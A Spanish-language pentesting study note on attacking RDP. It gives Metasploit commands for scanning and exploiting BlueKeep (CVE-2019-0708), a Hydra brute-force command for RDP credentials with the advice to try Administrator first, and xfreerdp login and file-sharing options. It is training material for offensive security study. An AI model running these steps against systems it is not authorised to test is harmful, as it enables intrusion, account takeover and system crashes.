**RDP (Remote Desktop Protocol)** es un protocolo propietario de Microsoft que permite a un usuario conectarse y controlar de forma remota un equipo a través de una interfaz gráfica. Funciona en un modelo cliente-servidor y es la herramienta estándar para la administración remota de escritorios Windows.

- **Puerto:** 3389 (TCP/UDP)

## 🖥️ RDP: Exploit BlueKeep (CVE-2019-0708)

- **CVE:** [CVE-2019-0708](https://www.cve.org/CVERecord?id=CVE-2019-0708)
- **Impacto:** Ejecución remota de código (RCE) pre-autenticación, otorgando privilegios de `NT AUTHORITY\SYSTEM`.

Al igual que EternalBlue, afecta a sistemas antiguos que no gestionan correctamente la memoria en canales virtuales:

- **Workstations:** Windows XP, Vista, 7.
- **Servers:** Windows Server 2008 y 2008 R2.

> [!caution] Este exploit toca el kernel para ejecutar código malicioso en la memoria, por lo que es peligroso. Puede crashear el sistema

### 🛠️ Metodología de Ataque

#### 1. Enumeración y Verificación

Antes de intentar la explotación, debemos verificar si el servicio es vulnerable sin llegar a tumbarlo.

|**Herramienta**|**Módulo / Comando**|
|---|---|
|**Metasploit**|`use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`|
#### 2. Explotación 
##### Con [[Metasploit]]

Para maximizar las posibilidades de éxito, es vital ser precisos con la configuración del módulo.

1. **Cargar módulo:** `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
2. **Configurar opciones:** 
	- `set RHOSTS <IP_Objetivo>`
    - `set LHOST <Tu_IP>`
3. **Selección del Target ⚠️(Crítico)⚠️:** A diferencia de otros exploits, aquí no se recomienda el "Automatic Target". Debes listar los objetivos y seleccionar el que coincida exactamente con la arquitectura del sistema remoto.
    - `show targets`
    - `set TARGET <ID>` (Ejemplo: `set TARGET 2` ).

![[Imagenes/TargetsBlueKeepMetasploit.png]]

## 🖥️ Acceso GUI: xfreerdp
**xfreerdp** es una implementación libre del protocolo RDP (Remote Desktop Protocol). A diferencia de las shells obtenidas por exploits, esta herramienta proporciona una **interfaz gráfica completa**, permitiendo interactuar con el escritorio del objetivo como si estuviéramos físicamente frente a la máquina.

- **Requisito:** Credenciales válidas (Usuario y Contraseña) y que el servicio permita conexiones remotas.
- **Puerto:** 3389 (TCP) por defecto.
### 🛠️ Metodología de Ataque
#### 1. Enumeración y Verificación
Antes de intentar la conexión, debemos confirmar que el servicio RDP está escuchando y aceptando peticiones.

|**Herramienta**|**Método / Comando**|
|---|---|
|**Nmap**|`nmap -p 3389 --script rdp-enum-encryption <IP>`|
|**Metasploit**|`use auxiliary/scanner/rdp/rdp_scanner`|

>[!tip] **Puerto No Estándar:** Si Nmap no devuelve resultados en el 3389, realiza un escaneo de todos los puertos (`-p-`), ya que los administradores a veces cambian el puerto RDP para evitar ataques automatizados.
#### 2. Obtención de credenciales
Si no hemos obtenido credenciales mediante post-explotación previa (como [[Pass the Hash Attacks]]), recurrimos a la fuerza bruta.
- **Herramienta:** [[Hydra]]
- **Comando:** `hydra -L <lista_users> -P <lista_pass> rdp://<IP> -s <PUERTO>`

> [!caution] **Prioridad:** Se recomienda probar siempre primero con el usuario `Administrator` o `Administrador`, ya que son las cuentas con mayores privilegios en el sistema.
#### 3. Uso de xfreerdp
Una vez tenemos las credenciales, establecemos la conexión gráfica.

- **Comando básico:** `xfreerdp /u:<usuario> /p:<password> /v:<IP>:<PUERTO>`
![[Imagenes/Comandoxfreerdp.png]]

#### Parámetros útiles adicionales:

- `/f`: Pantalla completa (Full screen).
- `/workarea`: Ajusta la resolución automáticamente al tamaño de tu pantalla de Kali.
- `+clipboard`: Permite copiar y pegar texto entre tu Kali y la máquina objetivo.
- `/drive:share,/tmp`: Crea una carpeta compartida para transferir archivos entre máquinas.

![[Imagenes/Usoxfreerdp.png]]
### ⚠️ Consideraciones de Pentesting

- **Visibilidad:** Al entrar por RDP, si el usuario real está logueado, es posible que su sesión se cierre o reciba un aviso de que otra persona se ha conectado, lo que te hace **muy detectable**.
- **Nivel de Privilegios:** La sesión gráfica tendrá exactamente los mismos permisos que el usuario cuyas credenciales has utilizado.
##
--- 
**Navegación:**
- Volver a: [[2.2 Servicios de Windows Frecuentemente Explotados]]
- Volver a: [[3.1 Explotación Vulnerabilidades de Windows]]